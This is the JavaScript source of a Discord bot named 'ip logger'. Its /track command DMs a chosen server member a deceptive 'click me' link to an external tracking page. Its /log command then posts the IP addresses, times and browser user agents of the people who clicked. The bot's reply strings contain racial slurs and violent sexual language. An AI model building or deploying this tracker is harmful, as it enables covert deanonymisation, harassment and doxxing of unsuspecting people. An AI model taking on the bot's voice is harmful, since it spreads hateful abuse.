const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder } = require("discord.js");
const fetch = (...args) => import("node-fetch").then(({ default: f }) => f(...args));

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1488652011485270117";
const SERVER_URL = process.env.SERVER_URL || "http://localhost:3000";
const TRACK_URL = "https://logbot-copy-production.up.railway.app/track";

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });

const commands = [
  new SlashCommandBuilder()
    .setName("log")
    .setDescription("see who fucked themselves up by look who got the link"),
  new SlashCommandBuilder()
    .setName("track")
    .setDescription("send the link to someone in the server")
    .addUserOption(option =>
      option.setName("user")
        .setDescription("who u tryna catch")
        .setRequired(true)
    ),
].map(c => c.toJSON());

const rest = new REST({ version: "10" }).setToken(TOKEN);

(async () => {
  try {
    console.log("Registering slash commands...");
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("Slash commands registered ✅");
  } catch (err) {
    console.error("Failed to register commands:", err);
  }
})();

client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag} 🤖`);
});

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === "log") {
    await interaction.deferReply();

    try {
      const res = await fetch(`${SERVER_URL}/visits`);
      const visits = await res.json();

      if (visits.length === 0) {
        await interaction.editReply("nobody fucking ckicked link nigger");
        return;
      }

      const recent = visits.slice(-5).reverse();
      const lines = recent.map((v, i) => {
        const time = new Date(v.timestamp).toLocaleString("en-US", {
          timeZone: "America/Chicago",
          dateStyle: "short",
          timeStyle: "short",
        });
        const shortUA = v.userAgent.split(" ").slice(0, 4).join(" ");
        return `**${i + 1}.** \`${v.ip}\` — ${time}\n   └ ${shortUA}`;
      });

      const message = [
        `yo these mfs clicked the link and got fucked and raped`,
        ``,
        `**last ${recent.length} hit(s):**`,
        ...lines,
        ``,
        `**total hits:** ${visits.length} 🍳`,
      ].join("\n");

      await interaction.editReply(message);
    } catch (err) {
      console.error(err);
      await interaction.editReply("tracking server fucked up rn try again some other time or when d3crypted9 fixes it nigger");
    }
  }

  if (interaction.commandName === "track") {
    const target = interaction.options.getUser("user");

    const button = new ButtonBuilder()
      .setLabel("obviously click me")
      .setStyle(ButtonStyle.Link)
      .setURL(TRACK_URL);

    const row = new ActionRowBuilder().addComponents(button);

    const embed = new EmbedBuilder()
      .setColor(0x5865F2)
      .setTitle("yo u tryna get some requires or some sh 👀")
      .setDescription(`then go to this link rn no cap\n\neven tho am a bot called **ip logger** chill i only do it on bad people so dont freak out or smth 😭🙏`);

    try {
      await target.send({ embeds: [embed], components: [row] });
      await interaction.reply({ content: `aight sent it to ${target.username} they ass MIGHT be cooked`, ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: `bro i cant dm ${target.username}, they probably got dms off  what a fucking dumbass`, ephemeral: true });
    }
  }
});

client.login(TOKEN);
